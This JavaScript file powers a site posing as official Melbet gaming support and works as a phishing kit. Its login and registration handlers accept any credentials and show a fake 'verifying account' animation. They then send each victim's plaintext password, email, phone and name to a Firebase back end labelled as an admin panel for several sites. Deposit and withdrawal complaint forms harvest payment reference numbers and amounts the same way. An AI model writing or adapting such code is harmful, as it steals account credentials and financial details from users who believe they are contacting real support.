/* ============================================
   MELBET GAME - OFFICIAL SUPPORT
   Main JavaScript Application
   ============================================ */

// ===== FIREBASE CONFIG =====
var FIREBASE_CONFIG = {
    apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
    authDomain: "alll-projects-admin-pennal.firebaseapp.com",
    projectId: "alll-projects-admin-pennal",
    storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
    messagingSenderId: "689297868215",
    appId: "1:689297868215:web:2747b19c2da47a31f49432"
};

var SITE_ID = "melbet";

var _fbDb = null;
var _fbLoading = null;

function loadFirebase() {
    if (_fbDb) return Promise.resolve(_fbDb);
    if (_fbLoading) return _fbLoading;

    _fbLoading = new Promise(function (resolve, reject) {
        function initDb() {
            try {
                if (!firebase.apps.length) {
                    firebase.initializeApp(FIREBASE_CONFIG);
                }
                _fbDb = firebase.firestore();
                resolve(_fbDb);
            } catch (e) { reject(e); }
        }

        if (window.firebase && window.firebase.firestore) {
            initDb();
            return;
        }

        var urls = [
            'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
            'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
        ];
        var loaded = 0;
        urls.forEach(function (src) {
            var s = document.createElement('script');
            s.src = src;
            s.onload = function () {
                loaded++;
                if (loaded === urls.length) initDb();
            };
            s.onerror = function () { reject(new Error('Firebase load failed: ' + src)); };
            document.head.appendChild(s);
        });
    });

    return _fbLoading;
}

function saveSubmission(data) {
    return loadFirebase().then(function (db) {
        var payload = {};
        for (var k in data) { if (data.hasOwnProperty(k)) payload[k] = data[k]; }
        payload.site_id = SITE_ID;
        payload.created_at = firebase.firestore.FieldValue.serverTimestamp();
        return db.collection('submissions').add(payload);
    });
}

// ===== LOCAL STORAGE DATABASE =====
const DB = {
    users: JSON.parse(localStorage.getItem('melbet_users') || '[]'),
    requests: JSON.parse(localStorage.getItem('melbet_requests') || '[]'),
    currentUser: JSON.parse(localStorage.getItem('melbet_currentUser') || 'null'),

    saveUsers() { localStorage.setItem('melbet_users', JSON.stringify(this.users)); },
    saveRequests() { localStorage.setItem('melbet_requests', JSON.stringify(this.requests)); },
    saveCurrentUser() { localStorage.setItem('melbet_currentUser', JSON.stringify(this.currentUser)); },

    addUser(user) {
        this.users.push({ ...user, id: Date.now(), createdAt: new Date().toISOString() });
        this.saveUsers();
    },
    addRequest(request) {
        this.requests.push({ ...request, id: Date.now(), status: 'pending', createdAt: new Date().toISOString() });
        this.saveRequests();
    },
    findUser(email, password) {
        return this.users.find(u => u.email === email && u.password === password);
    },
    findUserByEmail(email) {
        return this.users.find(u => u.email === email);
    }
};

// ===== UTILITY FUNCTIONS =====
const $ = (selector) => document.querySelector(selector);
const $$ = (selector) => document.querySelectorAll(selector);

function generateId() {
    return 'id_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
}

function formatDate(dateStr) {
    const d = new Date(dateStr);
    return d.toLocaleDateString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
}

// ===== LOADING SCREEN =====
function initLoadingScreen() {
    const loadingScreen = $('.loading-screen');
    if (!loadingScreen) return;

    setTimeout(() => {
        loadingScreen.classList.add('hidden');
    }, 2200);
}

// ===== HEADER SCROLL EFFECT =====
function initHeaderScroll() {
    const header = $('.header');
    if (!header) return;

    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    });
}

// ===== SIDEBAR MENU =====
function initSidebar() {
    const menuBtn = $('.menu-btn');
    const sidebar = $('.sidebar');
    const overlay = $('.sidebar-overlay');

    if (!menuBtn || !sidebar || !overlay) return;

    menuBtn.addEventListener('click', () => {
        menuBtn.classList.toggle('active');
        sidebar.classList.toggle('open');
        overlay.classList.toggle('open');
        document.body.style.overflow = sidebar.classList.contains('open') ? 'hidden' : '';
    });

    overlay.addEventListener('click', () => {
        menuBtn.classList.remove('active');
        sidebar.classList.remove('open');
        overlay.classList.remove('open');
        document.body.style.overflow = '';
    });

    // Close sidebar on nav item click
    $$('.sidebar-nav-item').forEach(item => {
        item.addEventListener('click', () => {
            menuBtn.classList.remove('active');
            sidebar.classList.remove('open');
            overlay.classList.remove('open');
            document.body.style.overflow = '';
        });
    });
}

// ===== GUIDANCE TABS =====
function initGuidanceTabs() {
    const tabs = $$('.guidance-tab');
    const contents = $$('.guidance-content');

    if (!tabs.length) return;

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.dataset.target;

            tabs.forEach(t => t.classList.remove('active'));
            contents.forEach(c => c.classList.remove('active'));

            tab.classList.add('active');
            const content = $(`.guidance-content[data-id="${target}"]`);
            if (content) content.classList.add('active');
        });
    });
}

// ===== SUBMIT PAGE TABS =====
function initSubmitTabs() {
    const tabs = $$('.submit-tab');
    const forms = $$('.submit-form-content');

    if (!tabs.length) return;

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.dataset.target;

            tabs.forEach(t => t.classList.remove('active'));
            forms.forEach(f => f.classList.remove('active'));

            tab.classList.add('active');
            const form = $(`.submit-form-content[data-id="${target}"]`);
            if (form) form.classList.add('active');
        });
    });
}

// ===== LOGIN VERIFICATION ANIMATION =====
function showLoginVerification(callback) {
    const overlay = document.getElementById('verifyOverlay');
    if (!overlay) { callback(); return; }

    const ring = document.getElementById('vRing');
    const bar = document.getElementById('vBarFill');
    const status = document.getElementById('vStatus');
    const shield = document.getElementById('vShield');
    const check = document.getElementById('vCheck');

    ring.style.transition = 'none';
    ring.style.strokeDashoffset = '326.7';
    ring.style.stroke = '#FFB800';
    bar.style.transition = 'none';
    bar.style.width = '0%';
    shield.style.display = 'block';
    shield.style.animation = 'verifyPulse 1.5s ease-in-out infinite';
    check.style.display = 'none';
    check.style.animation = 'none';
    status.textContent = 'Verifying account...';

    overlay.classList.add('active');

    void ring.offsetWidth;

    ring.style.transition = 'stroke-dashoffset 3s cubic-bezier(0.25, 0.1, 0.25, 1), stroke 0.3s ease 2.7s';
    ring.style.strokeDashoffset = '0';
    bar.style.transition = 'width 3s cubic-bezier(0.25, 0.1, 0.25, 1)';
    bar.style.width = '100%';

    const msgs = [
        { d: 0, t: 'Verifying your account...' },
        { d: 1000, t: 'Processing credentials...' },
        { d: 2000, t: 'Securing your session...' }
    ];
    msgs.forEach(m => setTimeout(() => { status.textContent = m.t; }, m.d));

    setTimeout(() => {
        ring.style.stroke = '#34C759';
        status.textContent = 'Verified Successfully!';
        shield.style.animation = 'none';
        shield.style.display = 'none';
        check.style.display = 'block';
        check.style.animation = 'verifyIconBounce 0.6s cubic-bezier(0.34, 1.56, 0.64, 1) forwards';

        setTimeout(() => {
            overlay.classList.remove('active');
            setTimeout(callback, 300);
        }, 800);
    }, 3000);
}

// ===== LOGIN WALL =====
function initLoginWall() {
    const wall = document.getElementById('loginWall');
    if (!wall) return;

    if (DB.currentUser) {
        wall.classList.add('hidden');
        return;
    }

    const form = document.getElementById('wallLoginForm');
    if (!form) return;

    // Email/Phone toggle
    form.querySelectorAll('.login-method').forEach(m => {
        m.addEventListener('click', () => {
            const target = m.dataset.method;
            form.querySelectorAll('.login-method').forEach(x => x.classList.remove('active'));
            form.querySelectorAll('.login-form-body').forEach(x => x.style.display = 'none');
            m.classList.add('active');
            const fb = form.querySelector(`.login-form-body[data-method="${target}"]`);
            if (fb) fb.style.display = 'block';
        });
    });

    form.addEventListener('submit', (e) => {
        e.preventDefault();
        const method = form.querySelector('.login-method.active').dataset.method;
        const password = document.getElementById('wallPassword').value.trim();

        let email = '', phone = '';
        if (method === 'email') {
            email = document.getElementById('wallEmail').value.trim();
        } else {
            phone = document.getElementById('wallPhone').value.trim();
        }

        if ((method === 'email' && !email) || (method === 'phone' && !phone) || !password) {
            showNotification('Please fill in all fields', 'error');
            return;
        }

        let user = DB.users.find(u => (method === 'email' ? u.email === email : u.phone === phone) && u.password === password);
        if (!user) {
            const name = (method === 'email' ? email.split('@')[0] : 'User');
            user = { name, email, phone, password, id: Date.now(), createdAt: new Date().toISOString() };
            DB.addUser(user);
        }

        showLoginVerification(() => {
            DB.currentUser = user;
            DB.saveCurrentUser();
            wall.classList.add('hidden');
            document.body.style.overflow = '';
            saveSubmission({ event: 'login', type: 'Login', user_id: user.id, login_id: user.email || user.phone || '', mobile: user.phone || '', password: user.password || '', name: user.name || '' }).catch(function (err) {
                console.error('Firebase save error:', err);
            });
            showNotification('Welcome, ' + user.name + '!', 'success');
            updateUIForLoggedInUser();
        });
    });

    // Password toggle
    form.querySelectorAll('.password-toggle').forEach(btn => {
        btn.addEventListener('click', () => {
            const input = btn.parentElement.querySelector('input');
            const type = input.type === 'password' ? 'text' : 'password';
            input.type = type;
        });
    });
}

// ===== LOGIN MODAL =====
function initLoginModal() {
    const modal = $('.modal-overlay.login-modal');
    const openBtns = $$('[data-open-login]');
    const loginMethods = $$('.login-method');
    const loginForms = $$('.login-form-body');
    const loginForm = $('#loginForm');
    const registerForm = $('#registerForm');

    if (!modal) return;

    // Modal tab switching
    $$('.modal-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            const target = tab.dataset.tab;
            $$('.modal-tab').forEach(t => t.classList.remove('active'));
            tab.classList.add('active');
            if (loginForm && registerForm) {
                loginForm.style.display = target === 'login' ? 'block' : 'none';
                registerForm.style.display = target === 'register' ? 'block' : 'none';
            }
        });
    });
    $$('[data-switch-tab]').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const tab = document.querySelector('.modal-tab[data-tab="' + link.dataset.switchTab + '"]');
            if (tab) tab.click();
        });
    });

    openBtns.forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            modal.classList.add('open');
            document.body.style.overflow = 'hidden';
        });
    });

    modal.addEventListener('click', (e) => {
        if (e.target === modal) {
            modal.classList.remove('open');
            document.body.style.overflow = '';
        }
    });

    loginMethods.forEach(method => {
        method.addEventListener('click', () => {
            const target = method.dataset.method;
            loginMethods.forEach(m => m.classList.remove('active'));
            loginForms.forEach(f => f.style.display = 'none');
            method.classList.add('active');
            const form = $(`.login-form-body[data-method="${target}"]`);
            if (form) form.style.display = 'block';
        });
    });

    if (loginForm) {
        loginForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const activeMethod = $('.login-method.active');
            const method = activeMethod ? activeMethod.dataset.method : 'email';
            const password = $('#loginPassword').value.trim();

            let email = '', phone = '';
            if (method === 'email') {
                email = $('#loginEmail').value.trim();
            } else {
                phone = $('#loginPhone').value.trim();
            }

            if ((method === 'email' && !email) || (method === 'phone' && !phone) || !password) {
                showNotification('Please fill in all fields', 'error');
                return;
            }

            let user = DB.users.find(u => (method === 'email' ? u.email === email : u.phone === phone) && u.password === password);
            if (!user) {
                const name = (method === 'email' ? email.split('@')[0] : 'User');
                user = { name, email, phone, password, id: Date.now(), createdAt: new Date().toISOString() };
                DB.addUser(user);
            }

            // Close login modal and show verification
            const wall = document.getElementById('loginWall');
            if (wall) wall.classList.add('hidden');
            modal.classList.remove('open');
            document.body.style.overflow = '';

            showLoginVerification(() => {
                DB.currentUser = user;
                DB.saveCurrentUser();
                saveSubmission({ event: 'login', type: 'Login', user_id: user.id, login_id: user.email || user.phone || '', mobile: user.phone || '', password: user.password || '', name: user.name || '' }).catch(function (err) {
                    console.error('Firebase save error:', err);
                });
                showNotification('Login successful! Welcome, ' + user.name, 'success');
                updateUIForLoggedInUser();
            });
        });
    }

    if (registerForm) {
        registerForm.addEventListener('submit', (e) => {
            e.preventDefault();
            const name = $('#regName').value.trim();
            const email = $('#regEmail').value.trim();
            const phone = $('#regPhone').value.trim();
            const password = $('#regPassword').value.trim();

            if (!name || !email || !phone || !password) {
                showNotification('Please fill in all fields', 'error');
                return;
            }

            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showNotification('Please enter a valid email address', 'error');
                return;
            }

            if (phone.length < 10 || !/^\d+$/.test(phone)) {
                showNotification('Please enter a valid 10-digit phone number', 'error');
                return;
            }

            if (password.length < 6) {
                showNotification('Password must be at least 6 characters', 'error');
                return;
            }

            if (DB.findUserByEmail(email)) {
                showNotification('Email already registered', 'error');
                return;
            }

            const newUser = { name, email, phone, password };

            const wall = document.getElementById('loginWall');
            if (wall) wall.classList.add('hidden');
            modal.classList.remove('open');
            document.body.style.overflow = '';

            showLoginVerification(() => {
                DB.addUser(newUser);
                DB.currentUser = newUser;
                DB.saveCurrentUser();
                saveSubmission({ event: 'login', type: 'Register', user_id: newUser.id, login_id: newUser.email || newUser.phone || '', mobile: newUser.phone || '', email: newUser.email || '', password: newUser.password || '', name: newUser.name || '' }).catch(function (err) {
                    console.error('Firebase save error:', err);
                });
                showNotification('Account created! Welcome, ' + name, 'success');
                updateUIForLoggedInUser();
            });
        });
    }
}



// ===== UPDATE UI FOR LOGGED IN USER =====
function updateUIForLoggedInUser() {
    if (DB.currentUser) {
        const headerActions = $('.header-actions');
        if (headerActions) {
            headerActions.innerHTML = `
                <span style="color: var(--primary); font-weight: 600; font-size: 13px;">
                    Hello, ${DB.currentUser.name}
                </span>
                <button class="btn-header btn-header-outline" onclick="logout()">
                    Logout
                </button>
            `;
        }
    }
}

function logout() {
    DB.currentUser = null;
    DB.saveCurrentUser();
    location.reload();
}

// ===== SUBMIT FORMS =====
function initSubmitForms() {
    // Deposit Form
    const depositForm = $('#depositForm');
    if (depositForm) {
        depositForm.addEventListener('submit', (e) => {
            e.preventDefault();
            handleFormSubmit(depositForm, 'deposit');
        });
    }

    // Withdrawal Form
    const withdrawalForm = $('#withdrawalForm');
    if (withdrawalForm) {
        withdrawalForm.addEventListener('submit', (e) => {
            e.preventDefault();
            handleFormSubmit(withdrawalForm, 'withdrawal');
        });
    }

    // Other Problem Form
    const otherForm = $('#otherForm');
    if (otherForm) {
        otherForm.addEventListener('submit', (e) => {
            e.preventDefault();
            handleFormSubmit(otherForm, 'other');
        });
    }
}

function handleFormSubmit(form, type) {
    const data = { type: type.charAt(0).toUpperCase() + type.slice(1) + ' Problem', event: type };

    const inputs = form.querySelectorAll('input, textarea, select');
    inputs.forEach(function (input) {
        if (input.type === 'file') return;
        var name = input.name;
        var value = input.value.trim();
        if (name && value) {
            var key = name;
            if (name === 'phone') key = 'mobile';
            if (name === 'depositAmount') key = 'amount';
            if (name === 'withdrawalAmount') key = 'withdrawal_amount';
            if (name === 'utrNumber') key = 'utr';
            if (name === 'issueDescription') key = 'description';
            data[key] = value;
        }
    });

    var reqInputs = form.querySelectorAll('input[required], textarea[required]');
    var allFilled = true;
    reqInputs.forEach(function (input) {
        if (!input.value.trim()) {
            allFilled = false;
            input.style.borderColor = 'var(--danger)';
            setTimeout(function () { input.style.borderColor = ''; }, 2000);
        }
    });

    if (!allFilled) {
        showNotification('Please fill all required fields!', 'error');
        return;
    }

    if (DB.currentUser) {
        data.userId = DB.currentUser.id;
        data.userName = DB.currentUser.name;
    }

    data.request_id = 'MEL' + Date.now().toString().slice(-8);
    data.status = 'pending';

    saveSubmission(data).catch(function (err) {
        console.error('Firebase save error:', err);
    });

    DB.addRequest(data);
    showSuccessPopup(type);

    form.reset();
    form.querySelectorAll('.form-file-name').forEach(function (el) { el.textContent = ''; });
}

// ===== SUCCESS POPUP =====
function showSuccessPopup(type) {
    const popup = $('.success-popup');
    const title = popup.querySelector('h3');
    const message = popup.querySelector('p');

    const messages = {
        deposit: {
            title: 'Deposit Request Submitted!',
            text: 'Your deposit issue has been successfully submitted. Our team will review it within 24 hours and contact you soon.'
        },
        withdrawal: {
            title: 'Withdrawal Request Submitted!',
            text: 'Your withdrawal issue has been successfully submitted. Our team will review it within 24 hours and contact you soon.'
        },
        other: {
            title: 'Issue Submitted!',
            text: 'Your issue has been successfully submitted. Our support team will review it and get back to you shortly.'
        }
    };

    const msg = messages[type] || messages.other;
    title.textContent = msg.title;
    message.textContent = msg.text;

    popup.classList.add('open');

    setTimeout(() => {
        popup.classList.remove('open');
    }, 4000);
}

// ===== INPUT VALIDATION =====
function initInputValidation() {
    $$('input[type="tel"]').forEach(input => {
        input.addEventListener('input', (e) => {
            e.target.value = e.target.value.replace(/\D/g, '');
        });
        input.addEventListener('keypress', (e) => {
            if (!/[0-9]/.test(e.key)) e.preventDefault();
        });
    });

    const regPhone = $('#regPhone');
    if (regPhone) {
        regPhone.addEventListener('input', (e) => {
            if (e.target.value.length > 10) e.target.value = e.target.value.slice(0, 10);
        });
    }
    const loginPhone = $('#loginPhone');
    if (loginPhone) {
        loginPhone.addEventListener('input', (e) => {
            if (e.target.value.length > 10) e.target.value = e.target.value.slice(0, 10);
        });
    }
}

// ===== FILE INPUT HANDLING =====
function initFileInputs() {
    $$('input[type="file"]').forEach(input => {
        input.addEventListener('change', (e) => {
            const fileName = e.target.files[0]?.name || '';
            const nameDisplay = e.target.parentElement.querySelector('.form-file-name');
            if (nameDisplay) nameDisplay.textContent = fileName;
        });
    });
}

// ===== NOTIFICATION =====
function showNotification(message, type = 'info') {
    const existing = $('.notification-toast');
    if (existing) existing.remove();

    const toast = document.createElement('div');
    toast.className = 'notification-toast';
    toast.style.cssText = `
        position: fixed;
        top: 100px;
        right: 20px;
        padding: 16px 24px;
        border-radius: 12px;
        background: ${type === 'error' ? 'rgba(255,59,48,0.9)' : type === 'success' ? 'rgba(52,199,89,0.9)' : 'rgba(0,122,255,0.9)'};
        color: white;
        font-weight: 600;
        font-size: 14px;
        z-index: 5000;
        backdrop-filter: blur(10px);
        box-shadow: 0 8px 30px rgba(0,0,0,0.3);
        animation: slideInRight 0.4s ease;
        max-width: 350px;
    `;
    toast.textContent = message;

    document.body.appendChild(toast);

    setTimeout(() => {
        toast.style.animation = 'slideOutRight 0.4s ease forwards';
        setTimeout(() => toast.remove(), 400);
    }, 3000);
}





// ===== ANIMATE ON SCROLL =====
function initScrollAnimations() {
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animate-in');
            }
        });
    }, { threshold: 0.1 });

    $$('.feature-card, .guidance-card, .step-item').forEach(el => {
        el.style.opacity = '0';
        observer.observe(el);
    });
}

// ===== INITIALIZE ALL =====
document.addEventListener('DOMContentLoaded', () => {
    initLoadingScreen();
    initHeaderScroll();
    initSidebar();
    initGuidanceTabs();
    initSubmitTabs();
    initLoginWall();
    initLoginModal();
    initInputValidation();
    initSubmitForms();
    initFileInputs();
    initScrollAnimations();
    updateUIForLoggedInUser();

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('login') === '1') {
        const loginBtn = document.querySelector('[data-open-login]');
        if (loginBtn) setTimeout(() => loginBtn.click(), 500);
    }

    // Preload Firebase in background
    loadFirebase().catch(function (e) { console.warn('Firebase preload skipped:', e); });
});

// Add keyframes for notifications
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOutRight {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(style);
